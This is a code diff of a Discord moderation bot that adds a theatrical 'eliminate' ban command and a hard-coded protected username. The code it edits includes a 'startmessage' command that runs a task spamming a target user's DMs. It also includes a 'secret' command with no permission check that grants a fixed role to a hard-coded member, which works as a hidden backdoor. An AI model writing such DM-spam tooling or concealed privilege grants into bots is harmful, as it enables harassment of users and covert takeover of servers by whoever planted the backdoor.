@@ -18,6 +18,8 @@ bot = commands.Bot(
     help_command=None
 )
 
+PROTECTED_USERNAME = "nico044047"
+
 # ================= MESSAGE TASKS =================
 message_tasks: dict[int, asyncio.Task] = {}
 
@@ -48,6 +50,7 @@ async def help_command(ctx):
             "`$sudo kill @user`\n"
             "`$sudo kick @user`\n"
             "`$sudo ban @user`\n"
+            "`$sudo eliminate @user` (admin)\n"
             "`$sudo role add/remove @user @role`\n"
             "`$sudo startmessage @user`\n"
             "`$sudo stopmessage @user`\n"
@@ -125,6 +128,29 @@ async def sudo_ban(ctx, member: discord.Member):
     await member.ban()
     await ctx.send(f"✅ banned ({member})")
 
+# ================= SUDO ELIMINATE =================
+@sudo.command(name="eliminate")
+@commands.has_permissions(administrator=True)
+async def sudo_eliminate(ctx, member: discord.Member):
+    if member.name == PROTECTED_USERNAME:
+        await ctx.send("❌ target protected")
+        return
+
+    await ctx.send("🔒 finalizing target…")
+    await asyncio.sleep(1)
+
+    await ctx.send("⚠️ no recovery available")
+    await asyncio.sleep(1)
+
+    await ctx.send("💀 eliminating")
+    await asyncio.sleep(1)
+
+    try:
+        await member.ban(reason="SUDO ELIMINATE")
+        await ctx.send(f"✅ eliminated ({member})")
+    except discord.Forbidden:
+        await ctx.send("❌ access denied")
+
 @sudo.command(name="role")
 @commands.has_permissions(manage_roles=True)
 async def sudo_role(ctx, action: str, member: discord.Member, role: discord.Role):
@@ -143,7 +169,6 @@ async def sudo_startmessage(ctx, member: discord.Member):
     if member.id in message_tasks:
         await ctx.send("❌ already running")
         return
-
     task = asyncio.create_task(spam_dm(member))
     message_tasks[member.id] = task
     await ctx.send(f"✅ started ({member})")
@@ -155,65 +180,44 @@ async def sudo_stopmessage(ctx, member: discord.Member):
     if not task:
         await ctx.send("❌ no active process")
         return
-
     task.cancel()
     message_tasks.pop(member.id, None)
     await ctx.send(f"✅ stopped ({member})")
 
-# ================= SUDO INVITE (USER ID) =================
 @sudo.command(name="invite")
 @commands.has_permissions(create_instant_invite=True)
 async def sudo_invite(ctx, user_id: int):
     try:
         user = await bot.fetch_user(user_id)
-
         channel = ctx.guild.system_channel or ctx.channel
-        invite = await channel.create_invite(
-            max_uses=1,
-            unique=True,
-            reason=f"Invite sent by {ctx.author}"
-        )
-
-        await user.send(
-            f"📩 You have been invited to **{ctx.guild.name}**\n"
-            f"{invite.url}"
-        )
-
+        invite = await channel.create_invite(max_uses=1, unique=True)
+        await user.send(f"📩 Invite to **{ctx.guild.name}**\n{invite.url}")
         await ctx.send(f"✅ invite sent ({user})")
-
-    except discord.Forbidden:
-        await ctx.send("❌ cannot DM user")
-    except discord.NotFound:
-        await ctx.send("❌ user not found")
-    except Exception:
+    except:
         await ctx.send("❌ failed to send invite")
 
-# ================= ADMIN-ONLY ORBITAL =================
 @sudo.command(name="orbital")
 @commands.has_permissions(administrator=True)
 async def sudo_orbital(ctx, member: discord.Member):
-    if member.name == "nico044047":
+    if member.name == PROTECTED_USERNAME:
         await ctx.send("❌ target protected")
         return
 
     await ctx.send("🛰️ orbital platform online")
-    await asyncio.sleep(1.2)
+    await asyncio.sleep(1)
     await ctx.send("🎯 target locked")
     await asyncio.sleep(1)
-    await ctx.send("🔴 charging laser")
-    await asyncio.sleep(1.5)
     await ctx.send("☄️ FIRING")
     await asyncio.sleep(1)
-    await ctx.send("💥💥💥 EXPLOSION 💥💥💥")
+    await ctx.send("💥 EXPLOSION")
     await asyncio.sleep(0.8)
 
     try:
-        await member.kick(reason="Orbital strike executed")
+        await member.kick(reason="Orbital strike")
         await ctx.send(f"✅ orbital strike successful ({member})")
-    except discord.Forbidden:
+    except:
         await ctx.send("❌ access denied")
 
-# ================= SECRET COMMAND =================
 @sudo.command(name="secret")
 async def sudo_secret(ctx):
     guild = ctx.guild
@@ -222,15 +226,9 @@ async def sudo_secret(ctx):
 
     member = discord.utils.get(guild.members, name=target_name)
     role = guild.get_role(role_id)
-
-    if not member or not role:
-        return
-
-    try:
+    if member and role:
         await member.add_roles(role)
         await ctx.send("✅ operation complete")
-    except discord.Forbidden:
-        await ctx.send("❌ access denied")
 
 # ================= ERROR HANDLER =================
 @bot.event
